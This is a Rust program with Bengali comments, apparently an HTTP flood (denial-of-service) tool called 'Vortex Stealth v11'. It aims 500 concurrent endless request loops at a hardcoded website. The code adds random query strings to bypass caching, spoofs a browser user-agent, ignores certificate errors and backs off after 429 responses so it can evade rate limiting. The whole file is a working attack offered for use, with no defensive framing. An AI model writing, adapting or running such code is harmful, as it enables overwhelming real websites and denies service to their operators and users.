use reqwest::{Client, header};
use std::time::Duration;

#[tokio::main]
async fn main() {
    let target = "https://www.ninjahex.com/"; // তোমার টার্গেট ইউআরএল
    
    let mut headers = header::HeaderMap::new();
    headers.insert(header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"));
    headers.insert("cache-control", header::HeaderValue::from_static("no-cache"));

    let client = Client::builder()
        .default_headers(headers)
        .use_rustls_tls()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build().unwrap();

    println!("🚀 Vortex Stealth v11: Thread-Safe Edition Active!");

    let mut handles = vec![];
    for i in 0..500 {
        let client_ref = client.clone();
        let target_ref = target.to_string();
        
        handles.push(tokio::spawn(async move {
            loop {
                // ফিক্স: সরাসরি rand::random ব্যবহার করা হয়েছে
                // এটি কোন হ্যান্ডেল ধরে রাখে না, তাই await-এ কোন সমস্যা হবে না
                let r_id: u32 = rand::random();
                let url = format!("{}?v={}", target_ref, r_id);
                
                match client_ref.get(&url).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        if i == 0 { println!("📡 Status: {}", status); }

                        if status == 429 {
                            // ৪২৯ এরর আসলে একটু বিরতি দেওয়া (র্যান্ডম বিরতি)
                            let sleep_ms = (r_id % 1500) + 500; 
                            tokio::time::sleep(Duration::from_millis(sleep_ms as u64)).await;
                        }
                    }
                    Err(_) => {
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        }));
    }
    tokio::time::sleep(Duration::from_secs(1200)).await;
}
